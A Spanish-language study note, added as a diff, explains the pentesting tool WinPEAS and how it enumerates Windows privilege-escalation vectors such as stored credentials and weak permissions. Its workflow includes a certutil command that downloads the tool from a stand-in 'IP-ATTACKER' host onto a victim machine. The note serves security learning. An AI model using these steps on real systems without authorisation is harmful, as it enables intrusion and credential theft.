@@ -1,0 +1,89 @@
+WinPEAS (Windows Privilege Escalation Awesome Script) es una herramienta desarrollada en C# y batch, que forma parte del proyecto PEAS (Privilege Escalation Awesome Scripts).
+
+Se utiliza en pentesting y auditorías de seguridad en Windows para enumerar información útil del sistema que pueda ayudar a escalar privilegios.
+
+Forma parte del repositorio PEASS-ng, que también incluye LinPEAS (para Linux).
+
+
+¿Para qué se usa WinPEAS?
+
+    Durante una intrusión o prueba de penetración en Windows, WinPEAS ayuda a descubrir:
+    
+        > Configuraciones inseguras en el sistema.
+        > Credenciales guardadas (en registros, archivos, servicios).
+        > Permisos incorrectos en directorios, archivos o binarios.
+        > Aplicaciones y servicios vulnerables.
+        > Actualizaciones faltantes y exploits posibles.
+        > Políticas débiles (ej: contraseñas simples, UAC mal configurado).
+        > Usuarios y grupos con privilegios elevados.
+    
+    Es una herramienta de post-explotación → se ejecuta una vez dentro de la máquina Windows para buscar vectores de privilege escalation.
+
+
+Modos de ejecución y opciones
+
+    > Versiones de WinPEAS
+    
+        winPEASany.exe → versión compilada con dependencias mínimas, funciona en casi cualquier Windows.
+        winPEASx64.exe / winPEASx86.exe → versiones específicas para arquitecturas de 32 o 64 bits.
+        winPEAS.bat → versión en batch (menos potente, pero útil si no puedes ejecutar binarios).
+    
+    > Ejecución básica
+    
+        Descargas el binario y lo ejecutas en la máquina víctima:
+        
+        .\winPEASany.exe
+    
+    > Ejecución con colores (más legible)
+	
+        .\winPEASany.exe cmd
+    
+    > Ejecución en modo “quiet” (menos ruido, solo hallazgos importantes)
+	
+        .\winPEASany.exe quiet
+    
+    > Redirigir salida a un archivo
+	
+        .\winPEASany.exe > resultado.txt
+
+
+Información que enumera WinPEAS
+
+    Entre otras cosas, busca y marca en colores según criticidad:
+    
+        🔴 Crítico (alta probabilidad de escalar privilegios)
+        
+        🟡 Interesante (posible vector)
+        
+        🟢 Informativo
+    
+    Ejemplos de lo que enumera:
+    
+        > Información de usuarios y grupos (administradores, RDP habilitado, etc.)
+        > Servicios configurados con permisos inseguros
+        > Tareas programadas que se ejecutan con privilegios altos
+        > Credenciales guardadas (en registros, GPP, archivos de configuración)
+        > Hotfixes faltantes → posibles exploits
+        > Permisos de carpetas mal configurados (ej: writable en C:\Program Files)
+        > Aplicaciones instaladas que podrían explotarse
+
+
+Ejemplo típico en pentesting
+
+    1. Obtienes acceso inicial a una máquina Windows (ej: con reverse shell).
+    
+    2. Descargas WinPEAS con PowerShell:
+    
+          certutil -urlcache -f http://IP-ATTACKER/winPEASany.exe winPEAS.exe
+    
+    3. Lo ejecutas:
+    
+          .\winPEAS.exe
+
+    4. Analizas los hallazgos para intentar escalar privilegios (ej: modificar un servicio, usar credenciales descubiertas, etc.).
+
+
+En resumen
+
+    > WinPEAS es una herramienta de enumeración de Windows usada en pentesting para detectar posibles vectores de escalada de privilegios.
+    > No explota por sí misma, pero te da pistas claras de dónde atacar.
